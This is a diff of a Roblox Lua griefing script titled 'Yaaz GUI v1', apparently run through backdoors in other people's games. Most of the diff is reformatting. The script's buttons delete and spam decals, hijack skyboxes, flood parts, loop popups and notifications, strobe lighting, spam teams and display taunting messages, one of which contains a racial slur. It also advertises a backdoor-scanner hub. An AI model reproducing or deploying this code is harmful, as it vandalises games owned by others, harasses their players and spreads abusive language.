@@ -5,7 +5,6 @@ local toggled = false
 local messageInstance = nil
 local soundInstance = nil
 
--- Create the GUI
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "Yaaz GUI v1"
 screenGui.ResetOnSpawn = false
@@ -20,16 +19,14 @@ frame.Active = true
 frame.Draggable = true
 frame.Parent = screenGui
 
--- Gradient Background
 local gradient = Instance.new("UIGradient")
 gradient.Color = ColorSequence.new({
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 200)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(200, 0, 100))
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(75, 0, 130)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 112))
 })
 gradient.Rotation = 45
 gradient.Parent = frame
 
--- Title Label
 local titleLabel = Instance.new("TextLabel")
 titleLabel.Size = UDim2.new(1, -120, 0, 50)
 titleLabel.Position = UDim2.new(0, 0, 0, 0)
@@ -40,7 +37,6 @@ titleLabel.TextScaled = true
 titleLabel.Font = Enum.Font.GothamBold
 titleLabel.Parent = frame
 
--- Anti-Leave Button
 local antiLeaveButton = Instance.new("TextButton")
 antiLeaveButton.Size = UDim2.new(0, 100, 0, 50)
 antiLeaveButton.Position = UDim2.new(1, -110, 0, 0)
@@ -60,7 +56,6 @@ antiLeaveButton.MouseButton1Click:Connect(function()
     antiLeaveButton.Visible = true
 end)
 
--- Scroll Frame for Buttons
 local scrollFrame = Instance.new("ScrollingFrame")
 scrollFrame.Size = UDim2.new(1, 0, 1, -50)
 scrollFrame.Position = UDim2.new(0, 0, 0, 50)
@@ -76,7 +71,6 @@ listLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
 listLayout.VerticalAlignment = Enum.VerticalAlignment.Top
 listLayout.Padding = UDim.new(0, 5)
 
--- Function to Create Buttons
 local function createButton(name, callback)
     local Button = Instance.new("TextButton")
     Button.Parent = scrollFrame
@@ -91,877 +85,873 @@ local function createButton(name, callback)
     Button.MouseButton1Click:Connect(callback)
 end
 
-    createButton("Decal Spam", function()
-        local decalId = "rbxassetid://126968470687373"
-        for _, obj in pairs(game.Workspace:GetDescendants()) do
-            if obj:IsA("Decal") then obj:Destroy() end
-        end
-        for _, part in pairs(game.Workspace:GetDescendants()) do
-            if part:IsA("BasePart") then
-                for _, face in pairs({"Front", "Back", "Right", "Left", "Top", "Bottom"}) do
-                    local decal = Instance.new("Decal")
-                    decal.Texture = decalId
-                    decal.Face = Enum.NormalId[face]
-                    decal.Parent = part
-                end
+createButton("Decal Spam", function()
+    local decalId = "rbxassetid://126968470687373"
+    for _, obj in pairs(game.Workspace:GetDescendants()) do
+        if obj:IsA("Decal") then obj:Destroy() end
+    end
+    for _, part in pairs(game.Workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+            for _, face in pairs({"Front", "Back", "Right", "Left", "Top", "Bottom"}) do
+                local decal = Instance.new("Decal")
+                decal.Texture = decalId
+                decal.Face = Enum.NormalId[face]
+                decal.Parent = part
             end
         end
-    end)
+    end
+end)
 
-    createButton("Decal Spam Friendaz", function()
-        local decalId = "rbxassetid://78341349822865"
-        for _, obj in pairs(game.Workspace:GetDescendants()) do
-            if obj:IsA("Decal") then obj:Destroy() end
-        end
-        for _, part in pairs(game.Workspace:GetDescendants()) do
-            if part:IsA("BasePart") then
-                for _, face in pairs({"Front", "Back", "Right", "Left", "Top", "Bottom"}) do
-                    local decal = Instance.new("Decal")
-                    decal.Texture = decalId
-                    decal.Face = Enum.NormalId[face]
-                    decal.Parent = part
-                end
+createButton("Decal Spam Friendaz", function()
+    local decalId = "rbxassetid://78341349822865"
+    for _, obj in pairs(game.Workspace:GetDescendants()) do
+        if obj:IsA("Decal") then obj:Destroy() end
+    end
+    for _, part in pairs(game.Workspace:GetDescendants()) do
+        if part:IsA("BasePart") then
+            for _, face in pairs({"Front", "Back", "Right", "Left", "Top", "Bottom"}) do
+                local decal = Instance.new("Decal")
+                decal.Texture = decalId
+                decal.Face = Enum.NormalId[face]
+                decal.Parent = part
             end
         end
-    end)
+    end
+end)
 
-    createButton("Skybox", function()
-        local lighting = game:GetService("Lighting")
-        local sky = Instance.new("Sky")
-        sky.Parent = lighting
-        for _, face in pairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
-            sky["Skybox"..face] = "rbxassetid://126968470687373"
+createButton("Skybox", function()
+    local lighting = game:GetService("Lighting")
+    local sky = Instance.new("Sky")
+    sky.Parent = lighting
+    for _, face in pairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
+        sky["Skybox"..face] = "rbxassetid://126968470687373"
+    end
+end)
+
+createButton("Skybox 2", function()
+    local lighting = game:GetService("Lighting")
+    local sky = Instance.new("Sky")
+    sky.Parent = lighting
+    for _, face in pairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
+        sky["Skybox"..face] = "rbxassetid://94480502868073"
+    end
+end)
+
+createButton("Skybox Spam", function()
+    local texture1 = "rbxassetid://94480502868073"
+    local texture2 = "rbxassetid://119180866533936"
+    local lighting = game:GetService("Lighting")
+    toggled = not toggled
+
+    local function applySkybox(textureID)
+        if not lighting:FindFirstChild("Skybox") then
+            local sky = Instance.new("Sky")
+            sky.Name = "Skybox"
+            sky.Parent = lighting
         end
-    end)
+        local skybox = lighting:FindFirstChild("Skybox")
+        skybox.SkyboxBk = textureID
+        skybox.SkyboxDn = textureID
+        skybox.SkyboxFt = textureID
+        skybox.SkyboxLf = textureID
+        skybox.SkyboxRt = textureID
+        skybox.SkyboxUp = textureID
+    end
 
-    createButton("Skybox 2", function()
-        local lighting = game:GetService("Lighting")
-        local sky = Instance.new("Sky")
-        sky.Parent = lighting
-        for _, face in pairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
-            sky["Skybox"..face] = "rbxassetid://94480502868073"
+    while toggled do
+        applySkybox(texture1)
+        task.wait(0.5)
+        if not toggled then break end
+        applySkybox(texture2)
+        task.wait(0.4)
+    end
+end)
+
+createButton("Skybox Friendaz", function()
+    local lighting = game:GetService("Lighting")
+    local sky = Instance.new("Sky")
+    sky.Parent = lighting
+    for _, face in pairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
+        sky["Skybox"..face] = "rbxassetid://78341349822865"
+    end
+end)
+
+createButton("RAINING .I.", function()
+    raining = not raining
+
+    if raining then
+        while raining do
+            task.spawn(function()
+                local part = Instance.new("Part")
+                part.Size = Vector3.new(1, 2, 1)
+                part.Position = Vector3.new(math.random(-50, 50), 50, math.random(-50, 50))
+                part.Anchored = false
+                part.CanCollide = false
+                part.Material = Enum.Material.Neon
+                part.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                part.Parent = game.Workspace
+
+                local bodyVelocity = Instance.new("BodyVelocity", part)
+                bodyVelocity.Velocity = Vector3.new(0, -30, 0)
+                bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
+
+                game:GetService("Debris"):AddItem(part, 3)
+            end)
+            task.wait(0.1)
         end
-    end)
+    end
+end)
 
-    createButton("Skybox Spam", function()
-        local texture1 = "rbxassetid://94480502868073"
-        local texture2 = "rbxassetid://119180866533936"
-        local lighting = game:GetService("Lighting")
-        toggled = not toggled
+createButton("Message", function()
+    if messageInstance then
+        messageInstance:Destroy()
+        messageInstance = nil
+    else
+        messageInstance = Instance.new("Message", game.Workspace)
+        messageInstance.Text = "TEAM YAAZ ON TOP LMFAO"
+    end
+end)
 
-        local function applySkybox(textureID)
-            if not lighting:FindFirstChild("Skybox") then
-                local sky = Instance.new("Sky")
-                sky.Name = "Skybox"
-                sky.Parent = lighting
-            end
-            local skybox = lighting:FindFirstChild("Skybox")
-            skybox.SkyboxBk = textureID
-            skybox.SkyboxDn = textureID
-            skybox.SkyboxFt = textureID
-            skybox.SkyboxLf = textureID
-            skybox.SkyboxRt = textureID
-            skybox.SkyboxUp = textureID
-        end
-
-        while toggled do
-            applySkybox(texture1)
-            task.wait(0.5)
-            if not toggled then break end
-            applySkybox(texture2)
-            task.wait(0.4)
-        end
-    end)
-
-    createButton("Skybox Friendaz", function()
-        local lighting = game:GetService("Lighting")
-        local sky = Instance.new("Sky")
-        sky.Parent = lighting
-        for _, face in pairs({"Bk", "Dn", "Ft", "Lf", "Rt", "Up"}) do
-            sky["Skybox"..face] = "rbxassetid://78341349822865"
-        end
-    end)
-
-    createButton("RAINING .I.", function()
-        raining = not raining
-
-        if raining then
-            while raining do
-                task.spawn(function()
-                    local part = Instance.new("Part")
-                    part.Size = Vector3.new(1, 2, 1)
-                    part.Position = Vector3.new(math.random(-50, 50), 50, math.random(-50, 50))
-                    part.Anchored = false
-                    part.CanCollide = false
-                    part.Material = Enum.Material.Neon
-                    part.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-                    part.Parent = game.Workspace
-
-                    local bodyVelocity = Instance.new("BodyVelocity", part)
-                    bodyVelocity.Velocity = Vector3.new(0, -30, 0)
-                    bodyVelocity.MaxForce = Vector3.new(0, math.huge, 0)
-
-                    game:GetService("Debris"):AddItem(part, 3)
-                end)
-                task.wait(0.1)
-            end
-        end
-    end)
-
-    createButton("Message", function()
-        if messageInstance then
-            messageInstance:Destroy()
-            messageInstance = nil
-        else
-            messageInstance = Instance.new("Message", game.Workspace)
-            messageInstance.Text = "TEAM YAAZ ON TOP LMFAO"
-        end
-    end)
-
-    createButton("Message 2", function()
-        if messageInstance then
-            messageInstance:Destroy()
-            messageInstance = nil
-        else
-            messageInstance = Instance.new("Message", game.Workspace)
-            messageInstance.Text = "TEAM YAAZ JOIN TODAY! 😱"
-        end
-    end)
+createButton("Message 2", function()
+    if messageInstance then
+        messageInstance:Destroy()
+        messageInstance = nil
+    else
+        messageInstance = Instance.new("Message", game.Workspace)
+        messageInstance.Text = "TEAM YAAZ JOIN TODAY! 😱"
+    end
+end)
 
 createButton("Message friend", function()
-        if messageInstance then
-            messageInstance:Destroy()
-            messageInstance = nil
-        else
-            messageInstance = Instance.new("Message", game.Workspace)
-            messageInstance.Text = "Team PyramidBrother On Top niggaz!!11!!"
-        end
-    end)
+    if messageInstance then
+        messageInstance:Destroy()
+        messageInstance = nil
+    else
+        messageInstance = Instance.new("Message", game.Workspace)
+        messageInstance.Text = "Team PyramidBrother On Top niggaz!!11!!"
+    end
+end)
 
-    createButton("Particles", function()
-        for _, obj in pairs(game.Workspace:GetDescendants()) do
-            if obj:IsA("BasePart") then
-                local particle = Instance.new("ParticleEmitter")
-                particle.Texture = "rbxassetid://126968470687373"
-                particle.Parent = obj
-            end
+createButton("Particles", function()
+    for _, obj in pairs(game.Workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            local particle = Instance.new("ParticleEmitter")
+            particle.Texture = "rbxassetid://126968470687373"
+            particle.Parent = obj
         end
-    end)
+    end
+end)
 
 createButton("Particles Friend", function()
-        for _, obj in pairs(game.Workspace:GetDescendants()) do
-            if obj:IsA("BasePart") then
-                local particle = Instance.new("ParticleEmitter")
-                particle.Texture = "rbxassetid://78341349822865"
-                particle.Parent = obj
-            end
+    for _, obj in pairs(game.Workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            local particle = Instance.new("ParticleEmitter")
+            particle.Texture = "rbxassetid://78341349822865"
+            particle.Parent = obj
+        end
+    end
+end)
+
+createButton("Spam popup", function()
+    while true do
+        local badge = Instance.new("ScreenGui", game.CoreGui)
+        local frame = Instance.new("Frame", badge)
+        local title = Instance.new("TextLabel", frame)
+        local desc = Instance.new("TextLabel", frame)
+
+        frame.Size = UDim2.new(0, 200, 0, 100)
+        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
+        frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        frame.BorderSizePixel = 3
+
+        title.Size = UDim2.new(1, 0, 0.4, 0)
+        title.Text = "Yaazie is controlling!"
+        title.TextScaled = true
+        title.BackgroundTransparency = 1
+        title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        title.Font = Enum.Font.SourceSansBold
+
+        desc.Size = UDim2.new(1, 0, 0.6, 0)
+        desc.Position = UDim2.new(0, 0, 0.4, 0)
+        desc.Text = "Yaazie is on top LOL"
+        desc.TextScaled = true
+        desc.BackgroundTransparency = 1
+        desc.TextColor3 = Color3.fromRGB(255, 255, 255)
+        desc.Font = Enum.Font.SourceSansItalic
+
+        game:GetService("Debris"):AddItem(badge, 3)
+
+        wait(0.1)
+    end
+end)
+
+createButton("Spam notification", function()
+    task.spawn(function()
+        while true do
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "HELLO TEAM YAAZKIDD HAX FUX UR GAME";
+                Text = "Yaaz is hax!1";
+                Duration = 2;
+                Icon = "rbxassetid://134742973539106";
+            })
+            wait(0.05)
         end
     end)
+end)
 
-    createButton("Spam popup", function()
-        while true do
-            local badge = Instance.new("ScreenGui", game.CoreGui)
-            local frame = Instance.new("Frame", badge)
-            local title = Instance.new("TextLabel", frame)
-            local desc = Instance.new("TextLabel", frame)
+createButton("Leaderstat Spam", function()
+    local Players = game:GetService("Players")
+    local LocalPlayer = Players.LocalPlayer
 
-            frame.Size = UDim2.new(0, 200, 0, 100)
-            frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
-            frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-            frame.BorderSizePixel = 3
-
-            title.Size = UDim2.new(1, 0, 0.4, 0)
-            title.Text = "Yaazie is controlling!"
-            title.TextScaled = true
-            title.BackgroundTransparency = 1
-            title.TextColor3 = Color3.fromRGB(255, 255, 255)
-            title.Font = Enum.Font.SourceSansBold
-
-            desc.Size = UDim2.new(1, 0, 0.6, 0)
-            desc.Position = UDim2.new(0, 0, 0.4, 0)
-            desc.Text = "Yaazie is on top LOL"
-            desc.TextScaled = true
-            desc.BackgroundTransparency = 1
-            desc.TextColor3 = Color3.fromRGB(255, 255, 255)
-            desc.Font = Enum.Font.SourceSansItalic
-
-            game:GetService("Debris"):AddItem(badge, 3)
-
-            wait(0.1)
+    while true do
+        local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
+        if not leaderstats then
+            leaderstats = Instance.new("Folder")
+            leaderstats.Name = "leaderstats"
+            leaderstats.Parent = LocalPlayer
         end
-    end)
 
-    createButton("Spam notification", function()
-        task.spawn(function()
-            while true do
-                game.StarterGui:SetCore("SendNotification", {
-                    Title = "HELLO TEAM YAAZKIDD HAX FUX UR GAME";
-                    Text = "Yaaz is hax!1";
-                    Duration = 2;
-                    Icon = "rbxassetid://134742973539106";
-                })
-                wait(0.05)
-            end
-        end)
-    end)
+        local stat = Instance.new("IntValue")
+        stat.Name = "TEAM YAAZ " .. math.random(1, 9999)
+        stat.Value = math.random(0, 100)
+        stat.Parent = leaderstats
 
-    createButton("Leaderstat Spam", function()
-        local Players = game:GetService("Players")
-        local LocalPlayer = Players.LocalPlayer
+        task.wait(0.1)
 
-        while true do
-            local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
-            if not leaderstats then
-                leaderstats = Instance.new("Folder")
-                leaderstats.Name = "leaderstats"
-                leaderstats.Parent = LocalPlayer
-            end
-
-            local stat = Instance.new("IntValue")
-            stat.Name = "TEAM YAAZ " .. math.random(1, 9999)
-            stat.Value = math.random(0, 100)
-            stat.Parent = leaderstats
-
-            task.wait(0.1)
-
-            for _, child in pairs(leaderstats:GetChildren()) do
-                child:Destroy()
-            end
+        for _, child in pairs(leaderstats:GetChildren()) do
+            child:Destroy()
         end
-    end)
+    end
+end)
 
-    createButton("Team Spam", function()
-        while true do
-            local teams = game:GetService("Teams")
+createButton("Team Spam", function()
+    while true do
+        local teams = game:GetService("Teams")
 
-            for i = 1, 5 do
-                local tempTeam = Instance.new("Team")
-                tempTeam.Name = "YAAZKIDD AKA SOLZ HAX THE GAM OOPZ"
-                tempTeam.TeamColor = BrickColor.Random()
-                tempTeam.Parent = teams
-            end
+        for i = 1, 5 do
+            local tempTeam = Instance.new("Team")
+            tempTeam.Name = "YAAZKIDD AKA SOLZ HAX THE GAM OOPZ"
+            tempTeam.TeamColor = BrickColor.Random()
+            tempTeam.Parent = teams
+        end
 
-            local player = game.Players.LocalPlayer
+        local player = game.Players.LocalPlayer
+        local allTeams = teams:GetChildren()
+        if player and #allTeams > 0 then
+            player.Team = allTeams[math.random(1, #allTeams)]
+            player.Neutral = false
+        end
+
+        task.wait(0.2)
+
+        for i = 1, 7 do
             local allTeams = teams:GetChildren()
-            if player and #allTeams > 0 then
-                player.Team = allTeams[math.random(1, #allTeams)]
-                player.Neutral = false
+            if #allTeams > 0 then
+                allTeams[math.random(1, #allTeams)]:Destroy()
             end
+        end
+    end
+end)
 
-            task.wait(0.2)
+createButton("Spooky", function()
+    local images = {
+        "http://www.roblox.com/asset/?id=169585459",
+        "http://www.roblox.com/asset/?id=169585475",
+        "http://www.roblox.com/asset/?id=169585485",
+        "http://www.roblox.com/asset/?id=169585502",
+        "http://www.roblox.com/asset/?id=169585515",
+        "http://www.roblox.com/asset/?id=169585502",
+        "http://www.roblox.com/asset/?id=169585485",
+        "http://www.roblox.com/asset/?id=169585475"
+    }
 
-            for i = 1, 7 do
-                local allTeams = teams:GetChildren()
-                if #allTeams > 0 then
-                    allTeams[math.random(1, #allTeams)]:Destroy()
-                end
+    local lighting = game:GetService("Lighting")
+    for _, v in pairs(lighting:GetChildren()) do
+        if v:IsA("Sky") then
+            v:Destroy()
+        end
+    end
+
+    local sky = Instance.new("Sky")
+    sky.Parent = lighting
+
+    local spookySound = Instance.new("Sound")
+    spookySound.Name = "Spooky"
+    spookySound.SoundId = "rbxassetid://104181508980428"
+    spookySound.Volume = 15
+    spookySound.Looped = true
+    spookySound.PlaybackSpeed = 0.2
+    spookySound.Parent = game.Workspace
+    spookySound:Play()
+
+    local running = true
+    task.spawn(function()
+        while running do
+            for _, image in ipairs(images) do
+                sky.SkyboxBk = image
+                sky.SkyboxDn = image
+                sky.SkyboxFt = image
+                sky.SkyboxLf = image
+                sky.SkyboxRt = image
+                sky.SkyboxUp = image
+                task.wait(0.15)
+                if not running then return end
             end
         end
     end)
+end)
 
-    createButton("Spooky", function()
-        local images = {
-            "http://www.roblox.com/asset/?id=169585459",
-            "http://www.roblox.com/asset/?id=169585475",
-            "http://www.roblox.com/asset/?id=169585485",
-            "http://www.roblox.com/asset/?id=169585502",
-            "http://www.roblox.com/asset/?id=169585515",
-            "http://www.roblox.com/asset/?id=169585502",
-            "http://www.roblox.com/asset/?id=169585485",
-            "http://www.roblox.com/asset/?id=169585475"
-        }
+createButton("MY EYES", function()
+    local lighting = game.Lighting
+    lighting.Brightness = 10
+    lighting.Ambient = Color3.new(1, 1, 1)
 
-        local lighting = game:GetService("Lighting")
-        for _, v in pairs(lighting:GetChildren()) do
-            if v:IsA("Sky") then
-                v:Destroy()
-            end
-        end
+    while true do
+        local randomColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
 
-        local sky = Instance.new("Sky")
-        sky.Parent = lighting
+        lighting.Ambient = randomColor
+        lighting.OutdoorAmbient = randomColor
 
-        local spookySound = Instance.new("Sound")
-        spookySound.Name = "Spooky"
-        spookySound.SoundId = "rbxassetid://104181508980428"
-        spookySound.Volume = 15
-        spookySound.Looped = true
-        spookySound.PlaybackSpeed = 0.2
-        spookySound.Parent = game.Workspace
-        spookySound:Play()
-
-        local running = true
-        task.spawn(function()
-            while running do
-                for _, image in ipairs(images) do
-                    sky.SkyboxBk = image
-                    sky.SkyboxDn = image
-                    sky.SkyboxFt = image
-                    sky.SkyboxLf = image
-                    sky.SkyboxRt = image
-                    sky.SkyboxUp = image
-                    task.wait(0.15)
-                    if not running then return end
-                end
-            end
-        end)
-    end)
-
-    createButton("MY EYES", function()
-        local lighting = game.Lighting
-        lighting.Brightness = 10
-        lighting.Ambient = Color3.new(1, 1, 1)
-
-        while true do
-            local randomColor = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))
-
-            lighting.Ambient = randomColor
-            lighting.OutdoorAmbient = randomColor
-
-            for _, part in ipairs(workspace:GetDescendants()) do
-                if part:IsA("BasePart") and not part:IsA("Terrain") then
-                    part.Color = randomColor
-                    part.Material = Enum.Material.Neon
-                end
+        for _, part in ipairs(workspace:GetDescendants()) do
+            if part:IsA("BasePart") and not part:IsA("Terrain") then
+                part.Color = randomColor
+                part.Material = Enum.Material.Neon
             end
             
             task.wait(0.05)
         end
-    end)
+    end
+end)
 
-    createButton("Hint", function()
-        local hint = Instance.new("Hint", game.Workspace)
-        hint.Text = "GUYS YAAZ JOIN, YAAZ ON TOP!"
-        task.wait(99999999999999999999999999999999999999)
-        hint:Destroy()
-    end)
+createButton("Hint", function()
+    local hint = Instance.new("Hint", game.Workspace)
+    hint.Text = "GUYS YAAZ JOIN, YAAZ ON TOP!"
+    task.wait(99999999999999999999999999999999999999)
+    hint:Destroy()
+end)
 
-    createButton("Hint 2", function()
-        local hint = Instance.new("Hint", game.Workspace)
-        hint.Text = "Roblox, it's so damn trash! I m4ke better!"
-        task.wait(99999999999999999999999999999999999999)
-        hint:Destroy()
-    end)
+createButton("Hint 2", function()
+    local hint = Instance.new("Hint", game.Workspace)
+    hint.Text = "Roblox, it's so damn trash! I m4ke better!"
+    task.wait(99999999999999999999999999999999999999)
+    hint:Destroy()
+end)
 
-    createButton("Hint 3", function()
-        local hint = Instance.new("Hint", game.Workspace)
-        hint.Text = "Hello server :) turn on recording pwease :3"
-        task.wait(99999999999999999999999999999999999999)
-        hint:Destroy()
-    end)
+createButton("Hint 3", function()
+    local hint = Instance.new("Hint", game.Workspace)
+    hint.Text = "Hello server :) turn on recording pwease :3"
+    task.wait(99999999999999999999999999999999999999)
+    hint:Destroy()
+end)
 
 createButton("Hint friend", function()
-        local hint = Instance.new("Hint", game.Workspace)
-        hint.Text = "Pyramid: I'll never give a fuck to people muahahaha!"
-        task.wait(99999999999999999999999999999999999999)
-        hint:Destroy()
-    end)
+    local hint = Instance.new("Hint", game.Workspace)
+    hint.Text = "Pyramid: I'll never give a fuck to people muahahaha!"
+    task.wait(99999999999999999999999999999999999999)
+    hint:Destroy()
+end)
 
 createButton("Lalol hub hint", function()
     while true do
         local hint = Instance.new("Hint", game.Workspace)
         hint.Text = "LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner"
-        task.wait(7) -- Hint stays for 7 seconds
+        task.wait(7)
         hint:Destroy()
-        task.wait(13) -- Wait 13 more seconds before showing again (20 - 7)
+        task.wait(13)
     end
 end)
 
-    createButton("Animated hint", function()
-        local hint = Instance.new("Hint")
-        hint.Parent = game.Workspace
-        hint.Text = ""
+createButton("Animated hint", function()
+    local hint = Instance.new("Hint")
+    hint.Parent = game.Workspace
+    hint.Text = ""
 
-        local message = "Hello, your game has been FUCKED by Team Yaaz.."
-        for i = 1, #message do
-            hint.Text = string.sub(message, 1, i)
-            wait(0.1)
-        end
+    local message = "Hello, your game has been FUCKED by Team Yaaz.."
+    for i = 1, #message do
+        hint.Text = string.sub(message, 1, i)
+        wait(0.1)
+    end
 
-        wait(2)
+    wait(2)
 
-        for i = #message, 1, -1 do
-            hint.Text = string.sub(message, 1, i - 1)
-            wait(0.1)
-        end
+    for i = #message, 1, -1 do
+        hint.Text = string.sub(message, 1, i - 1)
+        wait(0.1)
+    end
 
-        hint:Destroy()
-    end)
+    hint:Destroy()
+end)
 
 createButton("Animated hint Frend", function()
-        local hint = Instance.new("Hint")
-        hint.Parent = game.Workspace
-        hint.Text = ""
+    local hint = Instance.new("Hint")
+    hint.Parent = game.Workspace
+    hint.Text = ""
 
-        local message = "Pyramid: We gonna make it batter!11!!11"
-        for i = 1, #message do
-            hint.Text = string.sub(message, 1, i)
-            wait(0.1)
-        end
+    local message = "Pyramid: We gonna make it batter!11!!11"
+    for i = 1, #message do
+        hint.Text = string.sub(message, 1, i)
+        wait(0.1)
+    end
 
-        wait(2)
+    wait(2)
 
-        for i = #message, 1, -1 do
-            hint.Text = string.sub(message, 1, i - 1)
-            wait(0.1)
-        end
+    for i = #message, 1, -1 do
+        hint.Text = string.sub(message, 1, i - 1)
+        wait(0.1)
+    end
 
-        hint:Destroy()
-    end)
+    hint:Destroy()
+end)
 
-    createButton("Disco", function()
-        local lighting = game:GetService("Lighting")
-        local fogEffect = lighting:FindFirstChild("FogEffect") or Instance.new("ColorCorrectionEffect", lighting)
-        fogEffect.Name = "FogEffect"
+createButton("Disco", function()
+    local lighting = game:GetService("Lighting")
+    local fogEffect = lighting:FindFirstChild("FogEffect") or Instance.new("ColorCorrectionEffect", lighting)
+    fogEffect.Name = "FogEffect"
+    
+    local colors = {
+        Color3.fromRGB(255, 0, 0),
+        Color3.fromRGB(255, 165, 0),
+        Color3.fromRGB(255, 255, 0),
+        Color3.fromRGB(0, 255, 0),
+        Color3.fromRGB(0, 0, 255),
+        Color3.fromRGB(255, 192, 203),
+        Color3.fromRGB(128, 0, 128)
+    }
+    
+    local running = true
+    local index = 1
+    local transitionTime = 2
+    local startTime = os.clock()
+    
+    while running do
+        local currentTime = os.clock() - startTime
+        local progress = currentTime / transitionTime
         
-        local colors = {
-            Color3.fromRGB(255, 0, 0),
-            Color3.fromRGB(255, 165, 0),
-            Color3.fromRGB(255, 255, 0),
-            Color3.fromRGB(0, 255, 0),
-            Color3.fromRGB(0, 0, 255),
-            Color3.fromRGB(255, 192, 203),
-            Color3.fromRGB(128, 0, 128)
-        }
+        local currentColor = colors[index]
+        local nextColor = colors[(index % #colors) + 1]
         
-        local running = true
-        local index = 1
-        local transitionTime = 2
-        local startTime = os.clock()
+        fogEffect.TintColor = currentColor:Lerp(nextColor, progress)
         
-        while running do
-            local currentTime = os.clock() - startTime
-            local progress = currentTime / transitionTime
-            
-            local currentColor = colors[index]
-            local nextColor = colors[(index % #colors) + 1]
-            
-            fogEffect.TintColor = currentColor:Lerp(nextColor, progress)
-            
-            if progress >= 1 then
-                index = index + 1
-                if index > #colors then
-                    index = 1
-                end
-                startTime = os.clock()
+        if progress >= 1 then
+            index = index + 1
+            if index > #colors then
+                index = 1
             end
-            
-            task.wait()
+            startTime = os.clock()
         end
-    end)
-
-    createButton("Disco fog", function()
-        local discoFogEnabled = not discoFogEnabled
-        local colors = {
-            Color3.fromRGB(255, 0, 0),
-            Color3.fromRGB(255, 165, 0),
-            Color3.fromRGB(255, 255, 0),
-            Color3.fromRGB(0, 255, 0),
-            Color3.fromRGB(0, 0, 255),
-            Color3.fromRGB(255, 105, 180),
-            Color3.fromRGB(128, 0, 128)
-        }
         
-        game.Lighting.FogStart = 0
-        game.Lighting.FogEnd = 100
+        task.wait()
+    end
+end)
 
-        while discoFogEnabled do
-            for _, color in ipairs(colors) do
-                if not discoFogEnabled then 
-                    game.Lighting.FogColor = Color3.fromRGB(200, 200, 200)
-                    return 
-                end
-                game.Lighting.FogColor = color
-                wait(0.3)
+createButton("Disco fog", function()
+    local discoFogEnabled = not discoFogEnabled
+    local colors = {
+        Color3.fromRGB(255, 0, 0),
+        Color3.fromRGB(255, 165, 0),
+        Color3.fromRGB(255, 255, 0),
+        Color3.fromRGB(0, 255, 0),
+        Color3.fromRGB(0, 0, 255),
+        Color3.fromRGB(255, 105, 180),
+        Color3.fromRGB(128, 0, 128)
+    }
+    
+    game.Lighting.FogStart = 0
+    game.Lighting.FogEnd = 100
+
+    while discoFogEnabled do
+        for _, color in ipairs(colors) do
+            if not discoFogEnabled then 
+                game.Lighting.FogColor = Color3.fromRGB(200, 200, 200)
+                return 
             end
+            game.Lighting.FogColor = color
+            wait(0.3)
         end
-    end)
+    end
+end)
 
-    createButton("Ball Rain", function()
-        local RunService = game:GetService("RunService")
-        
-        local function spawnBall()
-            local ball = Instance.new("Part")
-            ball.Shape = Enum.PartType.Ball
-            ball.Size = Vector3.new(50, 50, 50)
-            ball.Position = Vector3.new(math.random(-100, 100), 100, math.random(-100, 100))
-            ball.Material = Enum.Material.SmoothPlastic
-            ball.Anchored = false
-            ball.CanCollide = true
-            ball.Parent = game.Workspace
+createButton("Ball Rain", function()
+    local RunService = game:GetService("RunService")
+    
+    local function spawnBall()
+        local ball = Instance.new("Part")
+        ball.Shape = Enum.PartType.Ball
+        ball.Size = Vector3.new(50, 50, 50)
+        ball.Position = Vector3.new(math.random(-100, 100), 100, math.random(-100, 100))
+        ball.Material = Enum.Material.SmoothPlastic
+        ball.Anchored = false
+        ball.CanCollide = true
+        ball.Parent = game.Workspace
 
-            spawn(function()
-                while ball.Parent do
-                    ball.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
-                    task.wait(0.1)
-                end
-            end)
-
-            game:GetService("Debris"):AddItem(ball, 10)
-        end
-
-        local running = true
         spawn(function()
-            while running do
-                spawnBall()
-                task.wait(0.2)
+            while ball.Parent do
+                ball.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
+                task.wait(0.1)
             end
         end)
+
+        game:GetService("Debris"):AddItem(ball, 10)
+    end
+
+    local running = true
+    spawn(function()
+        while running do
+            spawnBall()
+            task.wait(0.2)
+        end
     end)
+end)
 
-    createButton("Billboard", function()
-        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-        local head = character:WaitForChild("Head")
+createButton("Billboard", function()
+    local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+    local head = character:WaitForChild("Head")
 
-        local billboard = Instance.new("BillboardGui")
-        billboard.Adornee = head
-        billboard.Size = UDim2.new(0, 200, 0, 100)
-        billboard.AlwaysOnTop = true
-        billboard.StudsOffset = Vector3.new(0, 3, 0)
+    local billboard = Instance.new("BillboardGui")
+    billboard.Adornee = head
+    billboard.Size = UDim2.new(0, 200, 0, 100)
+    billboard.AlwaysOnTop = true
+    billboard.StudsOffset = Vector3.new(0, 3, 0)
